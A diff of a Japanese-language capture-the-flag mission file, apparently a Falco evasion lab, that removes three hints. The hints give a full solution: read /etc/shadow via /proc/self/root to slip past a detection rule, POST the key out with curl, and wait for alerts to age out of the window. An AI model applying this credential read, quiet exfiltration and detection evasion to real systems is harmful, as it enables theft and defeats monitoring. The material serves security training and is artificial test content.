@@ -61,38 +61,3 @@ CTF Company の **master key** にようやく手が届いた。だが「読む�
 
   /opt/ctf/missions/10-final-exfil/fixtures/welcome.txt   ← このファイル
   /opt/ctf/submit.sh                                       ← source して submit
-
-────────────────────────────────────────────────────────────────────
-HINT 1 (気付き): 「読む」だけでは終わらない
-────────────────────────────────────────────────────────────────────
-
-任務は master key を **箱の外へ持ち出す** こと。だが reverse shell や
-自前ツールの投下といった派手な exfil は、Mission 07/08 で見たとおり
-Falco の餌食になる。「どう静かに外へ出すか」が問われている。
-
-────────────────────────────────────────────────────────────────────
-HINT 2 (概要): 静かに読む + 静かに送る
-────────────────────────────────────────────────────────────────────
-
-  読む  : Read-sensitive を /proc/self/root で回避 (Mission 03)
-  送る  : reverse shell(C2/08)も drop+exec(07)も踏まず、**既存の curl**
-          で collector へ HTTP POST。collector は HTTP のみ受信するので
-          curl が唯一の現実解。
-
-その後 30 秒静かに待ってから submit (過去の発火を window から抜く)。
-
-────────────────────────────────────────────────────────────────────
-HINT 3 (解答): 読む → curl で exfil → 30 秒 → submit
-────────────────────────────────────────────────────────────────────
-
-  # 1) 発火させずに読む (Mission 03)
-  FLAG=$(grep CTF_MASTER_KEY /proc/self/root/etc/shadow | awk '{print $NF}')
-
-  # 2) 既存 curl で collector へ静かに持ち出す
-  curl -s "${FALCO_CTF_COLLECTOR}/api/challenges/10-final-exfil/exfil" \
-    -H 'Content-Type: application/json' \
-    -d "{\"user\":\"${FALCO_CTF_USER}\",\"flag\":\"${FLAG}\"}"
-
-  # 3) 30 秒何もせず待ってから提出
-  source /opt/ctf/submit.sh
-  submit 10-final-exfil "${FLAG}"
